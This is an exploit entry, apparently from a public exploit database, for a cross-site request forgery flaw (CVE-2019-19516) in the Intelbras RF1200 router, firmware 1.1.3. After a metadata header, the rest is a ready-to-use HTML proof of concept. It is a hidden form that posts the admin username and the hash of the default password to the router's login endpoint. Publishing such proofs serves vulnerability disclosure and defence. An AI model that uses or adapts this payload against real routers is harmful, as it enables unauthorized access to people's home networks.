# Exploit Title: Intelbras Router RF1200 1.1.3 - Cross-Site Request Forgery 
# Date: 2019-11-06
# Exploit Author: Joas Antonio
# Vendor Homepage: intelbras.com.br
# Software Link: https://www.intelbras.com/pt-br/roteador-wireless-smart-dual-band-action-rf-1200
# Version: 1.1.3 (REQUIRED)
# Tested on: Windows
# CVE : CVE-2019-19516

#POC1: 
<html>
	<body>
		<form method="POST" action="http://IPROUTERRF1200/login/Auth">
			<input type="hidden" name="username" value="admin"/>
			<input type="hidden" name="password" value="21232f297a57a5a743894a0e4a801fc3"/> <!-- password admin -->
			<input type="submit" value="Submit">
		</form>
	</body>
<html>